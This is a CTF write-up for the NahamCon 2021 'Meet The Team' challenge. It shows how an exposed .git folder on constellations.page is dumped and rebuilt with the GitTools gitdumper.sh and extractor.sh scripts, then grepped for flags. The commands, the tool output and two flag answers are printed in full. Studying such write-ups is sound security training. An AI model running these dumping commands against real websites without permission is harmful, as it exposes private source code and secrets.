---
layout: post
title:  "Meet The Team"
date:   2021-03-15 00:38:00 -0400
category: [writeups]
challenge-source: [NahamCon CTF 2021]
challenge-category: ['mission']
tags: [NahamConCTF2021]
author: shinris3n
---
<h1></h1>
<h3><font color=FF3030>Challenge Text</font></h3>

```
Author: @JohnHammond#6971

Recover the list of employees working at CONSTELLATIONS.

With the flag of this challenge, you should find new information that will help with future challenges.

You should find the flag for this challenge ON THIS constellations.page website. You will not find it on GitHub.

HINT: "Can we please stop sharing our version control software out on our website?"

HINT AGAIN: you are looking for a publicly accessible version control software folder published on the constellations.page website itself

After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.
``` 

<h1></h1>
<h3><font color=FF3030>Solution</font></h3>

- The hint for this challenge was the quote in the source code at https://constellations.page/meet-the-team.html:

```
<!-- Vela, can we please stop sharing our version control software out on the public internet? -->
```

- We see a Github link at the bottom of the page, which leads us to try:

![7f58c2422d6e80aa968d023dd1f79279.png](/assets/writeups/NahamConCTF2021/1b7d7180a341438f8014c69f21325f0b.png)

- We can't browse the directory structure, unfortunately, so we have to try to access default files and figure out a path from there.  There is an excellent resource [here](https://medium.com/swlh/hacking-git-directories-e0e60fa79a36){:target="_blank"} discussing some manual ways to discover files.

- The path of least resistance, however, is automating this process via [GitTools](https://github.com/internetwache/GitTools){:target="_blank"}.  Armed with this, we can run the "Dumper" tool first to find and pull the relevant contents from the site. (Note:  Having spaces in your path breaks this script, so check for this first.)


{% highlight bash %}
─$ bash gitdumper.sh http://constellations.page/.git/ ./git_pages_dump
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ./git_pages_dump/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/e7/d4663ac6b436f95684c8bfc428cef0d7731455
[+] Downloaded: objects/8e/9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/11/42cc3145fdba8d9eb8f9c9e7ee79bdfda64d9a
[+] Downloaded: objects/87/b17a86409582c162e260795afdf104dc1d46b1
...

{% endhighlight %}

- Next, we need to run the extractor script, which tries to iterate through the repo and recreate the contents by analyzing the commits.

{% highlight bash %} 

bash extractor.sh ./git_pages_dump ./git_pages_extracted
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: 8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073
[+] Found folder: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets
[+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/.DS_Store
[+] Found folder: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/css
[+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/css/grayscale.css
[+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/css/grayscale.min.css
[+] Found folder: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/fonts                                                                     
[+] Found folder: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/fonts/bootstrap                                                           
[+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/fonts/bootstrap/glyphicons-halflings-regular.eot                            
[+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/fonts/bootstrap/glyphicons-halflings-regular.svg                            
[+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/fonts/bootstrap/glyphicons-halflings-regular.ttf                            
[+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/fonts/bootstrap/glyphicons-halflings-regular.woff                           
[+] Found file: /your/path/git_pages_extracted/0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/assets/fonts/bootstrap/glyphicons-halflings-regular.woff2
...

{% endhighlight %}  

- Finally, it's just a matter of finding the flag in the reconstructed content.

{% highlight bash %}
$ ls
0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073
1-0780dea9ede681b1e4276d74740bb11056d97c39
2-e7d4663ac6b436f95684c8bfc428cef0d7731455
3-4c88ac1c56fe228267cf415c3ef87d7c3b8abd60
4-1142cc3145fdba8d9eb8f9c9e7ee79bdfda64d9a
5-87b17a86409582c162e260795afdf104dc1d46b1

$ grep -r "flag{"
3-4c88ac1c56fe228267cf415c3ef87d7c3b8abd60/meet-the-team.html:            <!-- <li><h4><b>flag{4063962f3a52f923ddb4411c139dd24c}</b></h4></li> -->
2-e7d4663ac6b436f95684c8bfc428cef0d7731455/robots.txt:flag{33b5240485dda77430d3de22996297a1}
1-0780dea9ede681b1e4276d74740bb11056d97c39/meet-the-team.html:            <!-- <li><h4><b>flag{4063962f3a52f923ddb4411c139dd24c}</b></h4></li> -->
1-0780dea9ede681b1e4276d74740bb11056d97c39/robots.txt:flag{33b5240485dda77430d3de22996297a1}
0-8e9e7afad5d1f7c6c3dcf322a3a94aeebc1e0073/robots.txt:flag{33b5240485dda77430d3de22996297a1}
{% endhighlight %}

